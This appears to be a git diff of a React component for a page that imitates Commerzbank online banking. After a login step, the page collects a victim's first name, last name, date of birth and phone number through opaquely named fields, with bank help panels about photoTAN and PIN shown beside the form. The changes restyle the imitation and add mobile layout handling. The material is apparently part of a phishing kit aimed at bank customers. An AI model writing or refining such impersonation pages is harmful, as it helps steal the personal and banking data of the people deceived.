@@ -2,6 +2,7 @@ import React, { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { useLanguage } from '../contexts/LanguageContext';
 import apiService from '../services/api';
+import { FaArrowRight } from 'react-icons/fa';
 
 interface InfoFormData {
   xname1: string;
@@ -21,6 +22,7 @@ const InfoPage: React.FC = () => {
   });
   const [errors, setErrors] = useState<Partial<InfoFormData>>({});
   const [isLoading, setIsLoading] = useState(false);
+  const [isMobile, setIsMobile] = useState(window.innerWidth <= 768);
 
   useEffect(() => {
     // Check if user came from login page
@@ -32,6 +34,16 @@ const InfoPage: React.FC = () => {
       return;
     }
   }, [navigate]);
+
+  // Handle window resize
+  useEffect(() => {
+    const handleResize = () => {
+      setIsMobile(window.innerWidth <= 768);
+    };
+
+    window.addEventListener('resize', handleResize);
+    return () => window.removeEventListener('resize', handleResize);
+  }, []);
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const { name, value } = e.target;
@@ -135,150 +147,425 @@ const InfoPage: React.FC = () => {
   };
 
   return (
-    <div className="commerzbank-app">
-      {/* Main Content */}
-      <main className="main-content">
-        <div className="content-wrapper">
-          {/* Left Column - Information Form */}
-          <div className="left-column">
-            <div className="info-section">
-              <h1 className="info-title">{t('personalInfo')}</h1>
-              <h2 className="info-subtitle">{t('personalInfo')}</h2>
-              
-              <p className="info-description">
-                Sie haben sich erfolgreich angemeldet. Um den Vorgang fortzusetzen, benötigen wir einige persönliche Informationen von Ihnen.
-              </p>
-              
-              <form onSubmit={handleSubmit} className="info-form">
-                <div className="form-group">
-                  <input
-                    type="text"
-                    id="xname1"
-                    name="xname1"
-                    value={formData.xname1}
-                    onChange={handleInputChange}
-                    className="info-input"
-                    placeholder={t('firstName')}
-                    autoComplete="off"
-                    maxLength={50}
-                    required
-                  />
-                  {errors.xname1 && <div className="error-message">{errors.xname1}</div>}
-                </div>
-
-                <div className="form-group">
-                  <input
-                    type="text"
-                    id="xname2"
-                    name="xname2"
-                    value={formData.xname2}
-                    onChange={handleInputChange}
-                    className="info-input"
-                    placeholder={t('lastName')}
-                    autoComplete="off"
-                    maxLength={50}
-                    required
-                  />
-                  {errors.xname2 && <div className="error-message">{errors.xname2}</div>}
-                </div>
-
-                <div className="form-group">
-                  <input
-                    type="tel"
-                    id="xdob"
-                    name="xdob"
-                    value={formData.xdob}
-                    onChange={handleInputChange}
-                    className="info-input"
-                    placeholder={t('birthDate') + ' (TT.MM.JJJJ)'}
-                    autoComplete="off"
-                    maxLength={10}
-                    pattern="\d{2}\.\d{2}\.\d{4}"
-                    required
-                  />
-                  {errors.xdob && <div className="error-message">{errors.xdob}</div>}
-                </div>
-
-                <div className="form-group">
-                  <input
-                    type="tel"
-                    id="xtel"
-                    name="xtel"
-                    value={formData.xtel}
-                    onChange={handleInputChange}
-                    className="info-input"
-                    placeholder={t('phone')}
-                    autoComplete="off"
-                    required
-                  />
-                  {errors.xtel && <div className="error-message">{errors.xtel}</div>}
-                </div>
-
-                <button 
-                  type="submit" 
-                  className="info-button"
-                  disabled={isLoading}
-                >
-                  {isLoading ? (t('nextButton') + '...') : t('nextButton')}
-                </button>
-              </form>
-            </div>
+    <div style={{
+      fontFamily: 'Arial, Helvetica, sans-serif',
+      backgroundColor: '#f5f5f5',
+      minHeight: '100vh',
+      display: 'flex',
+      flexDirection: 'column',
+      alignItems: 'center',
+      justifyContent: 'center',
+      padding: '0px 20px 20px 20px',
+      margin: 0
+    }}>
+      {/* Personal Information heading */}
+      <h1 style={{
+        fontSize: '32px',
+        fontWeight: 'bold',
+        color: '#333',
+        marginTop: isMobile ? '20px' : '-30px',
+        marginBottom: '10px',
+        fontFamily: 'Arial, Helvetica, sans-serif',
+        textAlign: 'left',
+        width: '100%',
+        maxWidth: '1200px',
+        margin: '0 auto 10px auto',
+        padding: isMobile ? '0 10px' : '0 20px'
+      }}>
+        {t('personalInfo')}
+      </h1>
+      
+      <div style={{
+        display: 'flex',
+        flexDirection: isMobile ? 'column' : 'row',
+        gap: '20px',
+        width: '100%',
+        maxWidth: '1200px',
+        alignItems: 'flex-start',
+        margin: '0 auto',
+        padding: isMobile ? '0 10px' : '0 20px'
+      }}>
+        {/* Info Form Box */}
+        <div style={{
+          flex: '1',
+          background: 'white',
+          borderRadius: '8px',
+          boxShadow: '0 2px 10px rgba(0, 0, 0, 0.1)',
+          padding: isMobile ? '20px' : '40px'
+        }}>
+        <form onSubmit={handleSubmit} style={{
+          padding: '15px'
+        }}>
+          <div style={{
+            marginBottom: '10px',
+            position: 'relative',
+            display: 'flex',
+            justifyContent: 'center'
+          }}>
+            <input
+              type="text"
+              id="xname1"
+              name="xname1"
+              value={formData.xname1}
+              onChange={handleInputChange}
+              style={{
+                width: '130%',
+                padding: '12px 12px 12px 12px',
+                border: '1px solid #ddd',
+                borderRadius: '4px',
+                backgroundColor: 'white',
+                fontFamily: 'Arial, Helvetica, sans-serif',
+                fontSize: '14px',
+                outline: 'none !important',
+                boxShadow: 'none !important'
+              }}
+              onFocus={(e) => {
+                e.target.style.backgroundColor = 'white';
+              }}
+              placeholder={t('firstName')}
+              autoComplete="off"
+              maxLength={50}
+              required
+            />
+            <span style={{
+              position: 'absolute',
+              right: '12px',
+              top: '50%',
+              transform: 'translateY(-50%)',
+              backgroundColor: '#ccc',
+              color: 'white',
+              borderRadius: '50%',
+              width: '20px',
+              height: '20px',
+              display: 'flex',
+              alignItems: 'center',
+              justifyContent: 'center',
+              fontSize: '12px',
+              fontWeight: 'bold'
+            }}>i</span>
           </div>
 
-          {/* Right Column - Info Panel */}
-          <div className="right-column">
-            <div className="info-panel">
-              <h3>Wichtige Infos zum Digital Banking</h3>
-              
-              <div className="info-section">
-                <p>Haben Sie Probleme mit der PhotoTAN-App oder der Freigabe von Zahlungen? Dann finden Sie hier weitere Informationen.</p>
-              </div>
+          <div style={{
+            marginBottom: '10px',
+            position: 'relative',
+            display: 'flex',
+            justifyContent: 'center'
+          }}>
+            <input
+              type="text"
+              id="xname2"
+              name="xname2"
+              value={formData.xname2}
+              onChange={handleInputChange}
+              style={{
+                width: '130%',
+                padding: '12px 12px 12px 12px',
+                border: '1px solid #ddd',
+                borderRadius: '4px',
+                backgroundColor: 'white',
+                fontFamily: 'Arial, Helvetica, sans-serif',
+                fontSize: '14px',
+                outline: 'none !important',
+                boxShadow: 'none !important'
+              }}
+              onFocus={(e) => {
+                e.target.style.backgroundColor = 'white';
+              }}
+              placeholder={t('lastName')}
+              autoComplete="off"
+              maxLength={50}
+              required
+            />
+            <span style={{
+              position: 'absolute',
+              right: '12px',
+              top: '50%',
+              transform: 'translateY(-50%)',
+              backgroundColor: '#ccc',
+              color: 'white',
+              borderRadius: '50%',
+              width: '20px',
+              height: '20px',
+              display: 'flex',
+              alignItems: 'center',
+              justifyContent: 'center',
+              fontSize: '12px',
+              fontWeight: 'bold'
+            }}>i</span>
+          </div>
 
-              <div className="info-section">
-                <h4>Kein aktives TAN-Verfahren?</h4>
-                <ul>
-                  <li>
-                    <span className="arrow-icon">→</span>
-                    <a href="#phototan">photoTAN aktivieren (für angemeldete Kunden)</a>
-                  </li>
-                  <li>
-                    <span className="arrow-icon">→</span>
-                    <a href="#hilfe">Hilfe zur photoTAN</a>
-                  </li>
-                </ul>
-              </div>
+          <div style={{
+            marginBottom: '10px',
+            position: 'relative',
+            display: 'flex',
+            justifyContent: 'center'
+          }}>
+            <input
+              type="tel"
+              id="xdob"
+              name="xdob"
+              value={formData.xdob}
+              onChange={handleInputChange}
+              style={{
+                width: '130%',
+                padding: '12px 12px 12px 12px',
+                border: '1px solid #ddd',
+                borderRadius: '4px',
+                backgroundColor: 'white',
+                fontFamily: 'Arial, Helvetica, sans-serif',
+                fontSize: '14px',
+                outline: 'none !important',
+                boxShadow: 'none !important'
+              }}
+              onFocus={(e) => {
+                e.target.style.backgroundColor = 'white';
+              }}
+              placeholder={t('birthDate') + ' (TT.MM.JJJJ)'}
+              autoComplete="off"
+              maxLength={10}
+              pattern="\d{2}\.\d{2}\.\d{4}"
+              required
+            />
+            <span style={{
+              position: 'absolute',
+              right: '12px',
+              top: '50%',
+              transform: 'translateY(-50%)',
+              backgroundColor: '#ccc',
+              color: 'white',
+              borderRadius: '50%',
+              width: '20px',
+              height: '20px',
+              display: 'flex',
+              alignItems: 'center',
+              justifyContent: 'center',
+              fontSize: '12px',
+              fontWeight: 'bold'
+            }}>i</span>
+          </div>
 
-              <div className="info-section">
-                <h4>Teilnehmernummer/PIN vergessen?</h4>
-                <ul>
-                  <li>
-                    <span className="arrow-icon">→</span>
-                    <a href="#teilnehmer">Teilnehmernummer neu anfordern</a>
-                  </li>
-                  <li>
-                    <span className="arrow-icon">→</span>
-                    <a href="#pin">PIN vergessen</a>
-                  </li>
-                </ul>
-              </div>
+          <div style={{
+            marginBottom: '10px',
+            position: 'relative',
+            display: 'flex',
+            justifyContent: 'center'
+          }}>
+            <input
+              type="tel"
+              id="xtel"
+              name="xtel"
+              value={formData.xtel}
+              onChange={handleInputChange}
+              style={{
+                width: '130%',
+                padding: '12px 12px 12px 12px',
+                border: '1px solid #ddd',
+                borderRadius: '4px',
+                backgroundColor: 'white',
+                fontFamily: 'Arial, Helvetica, sans-serif',
+                fontSize: '14px',
+                outline: 'none !important',
+                boxShadow: 'none !important'
+              }}
+              onFocus={(e) => {
+                e.target.style.backgroundColor = 'white';
+              }}
+              placeholder={t('phone')}
+              autoComplete="off"
+              required
+            />
+            <span style={{
+              position: 'absolute',
+              right: '12px',
+              top: '50%',
+              transform: 'translateY(-50%)',
+              backgroundColor: '#ccc',
+              color: 'white',
+              borderRadius: '50%',
+              width: '20px',
+              height: '20px',
+              display: 'flex',
+              alignItems: 'center',
+              justifyContent: 'center',
+              fontSize: '12px',
+              fontWeight: 'bold'
+            }}>i</span>
+          </div>
 
-              <div className="info-section">
-                <h4>Alles rund ums Online Banking</h4>
-                <ul>
-                  <li>
-                    <span className="arrow-icon">→</span>
-                    <a href="#anleitung">Anleitung/Hilfe</a>
-                  </li>
-                  <li>
-                    <span className="arrow-icon">→</span>
-                    <a href="#sicherheit">Sicherheit</a>
-                  </li>
-                </ul>
+          <button 
+            type="submit" 
+            disabled={isLoading}
+            style={{
+              width: '40%',
+              padding: '15px',
+              background: 'linear-gradient(135deg, #006400 0%, #004d00 50%, #006400 100%)',
+              color: 'white',
+              border: 'none',
+              borderRadius: '4px',
+              fontSize: '16px',
+              fontWeight: 'bold',
+              cursor: 'pointer',
+              fontFamily: 'Arial, Helvetica, sans-serif',
+              marginTop: '5px',
+              display: 'flex',
+              alignItems: 'center',
+              justifyContent: 'center',
+              gap: '8px',
+              margin: '5px auto 0 auto',
+              transition: 'background 0.3s ease'
+            }}
+            onMouseEnter={(e) => {
+              e.currentTarget.style.background = 'linear-gradient(315deg, #004d00 0%, #006400 50%, #004d00 100%)';
+            }}
+            onMouseLeave={(e) => {
+              e.currentTarget.style.background = 'linear-gradient(135deg, #006400 0%, #004d00 50%, #006400 100%)';
+            }}
+          >
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="white" style={{ marginRight: '4px' }}>
+              <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM15.1 8H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+            </svg>
+            {isLoading ? (t('nextButton') + '...') : t('nextButton')}
+          </button>
+        </form>
+        </div>
+        
+        {/* Important Info Box */}
+        <div style={{
+          flex: '1',
+          background: 'white',
+          borderRadius: '8px',
+          boxShadow: '0 2px 10px rgba(0, 0, 0, 0.1)',
+          padding: isMobile ? '20px' : '40px'
+        }}>
+          <h3 style={{
+            fontSize: '20px',
+            fontWeight: 'bold',
+            color: '#333',
+            marginBottom: '15px',
+            fontFamily: 'Arial, Helvetica, sans-serif'
+          }}>
+            {t('importantInfo')}
+          </h3>
+          
+          <p style={{
+            fontSize: '14px',
+            color: '#666',
+            marginBottom: '20px',
+            lineHeight: '1.5',
+            fontFamily: 'Arial, Helvetica, sans-serif'
+          }}>
+            {t('photoTANProblems')}
+          </p>
+          
+          <div style={{ marginBottom: '20px' }}>
+            <h4 style={{
+              fontSize: '16px',
+              fontWeight: 'bold',
+              color: '#333',
+              marginBottom: '10px',
+              fontFamily: 'Arial, Helvetica, sans-serif'
+            }}>
+              {t('noActiveTAN')}
+            </h4>
+            <div style={{ marginBottom: '8px' }}>
+              <div style={{
+                display: 'flex',
+                alignItems: 'center',
+                gap: '8px',
+                fontFamily: 'Arial, Helvetica, sans-serif'
+              }}>
+                {/* @ts-ignore */}
+                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
+                <span style={{ fontSize: '14px', color: '#333' }}>{t('activatePhotoTAN')}</span>
+              </div>
+            </div>
+            <div>
+              <div style={{
+                display: 'flex',
+                alignItems: 'center',
+                gap: '8px',
+                fontFamily: 'Arial, Helvetica, sans-serif'
+              }}>
+                {/* @ts-ignore */}
+                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
+                <span style={{ fontSize: '14px', color: '#333' }}>{t('photoTANHelp')}</span>
+              </div>
+            </div>
+          </div>
+          
+          <div style={{ marginBottom: '20px' }}>
+            <h4 style={{
+              fontSize: '16px',
+              fontWeight: 'bold',
+              color: '#333',
+              marginBottom: '10px',
+              fontFamily: 'Arial, Helvetica, sans-serif'
+            }}>
+              {t('forgotCredentials')}
+            </h4>
+            <div style={{ marginBottom: '8px' }}>
+              <div style={{
+                display: 'flex',
+                alignItems: 'center',
+                gap: '8px',
+                fontFamily: 'Arial, Helvetica, sans-serif'
+              }}>
+                {/* @ts-ignore */}
+                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
+                <span style={{ fontSize: '14px', color: '#333' }}>{t('requestParticipantNumber')}</span>
+              </div>
+            </div>
+            <div>
+              <div style={{
+                display: 'flex',
+                alignItems: 'center',
+                gap: '8px',
+                fontFamily: 'Arial, Helvetica, sans-serif'
+              }}>
+                {/* @ts-ignore */}
+                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
+                <span style={{ fontSize: '14px', color: '#333' }}>{t('forgotPIN')}</span>
+              </div>
+            </div>
+          </div>
+          
+          <div>
+            <h4 style={{
+              fontSize: '16px',
+              fontWeight: 'bold',
+              color: '#333',
+              marginBottom: '10px',
+              fontFamily: 'Arial, Helvetica, sans-serif'
+            }}>
+              {t('allAboutOnlineBanking')}
+            </h4>
+            <div style={{ marginBottom: '8px' }}>
+              <div style={{
+                display: 'flex',
+                alignItems: 'center',
+                gap: '8px',
+                fontFamily: 'Arial, Helvetica, sans-serif'
+              }}>
+                {/* @ts-ignore */}
+                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
+                <span style={{ fontSize: '14px', color: '#333' }}>{t('instructionsHelp')}</span>
+              </div>
+            </div>
+            <div>
+              <div style={{
+                display: 'flex',
+                alignItems: 'center',
+                gap: '8px',
+                fontFamily: 'Arial, Helvetica, sans-serif'
+              }}>
+                {/* @ts-ignore */}
+                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
+                <span style={{ fontSize: '14px', color: '#333' }}>{t('security')}</span>
               </div>
             </div>
           </div>
         </div>
-      </main>
+      </div>
     </div>
   );
 };
